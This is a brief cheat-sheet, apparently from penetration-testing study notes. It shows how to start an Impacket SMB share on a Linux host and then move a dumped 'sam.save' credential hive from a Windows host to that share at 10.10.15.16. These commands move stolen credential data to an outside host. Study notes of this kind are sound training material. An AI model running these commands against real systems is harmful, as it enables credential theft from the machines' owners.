-- -
### Create Share
on linux host:
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

sudo impacket-smbserver -smb2support <share name> <where share will be mounted>
```
### Transfer from windows host
```powershell
move sam.save \\10.10.15.16\CompData
move <target fil> \\<target ip>\<share name> 
```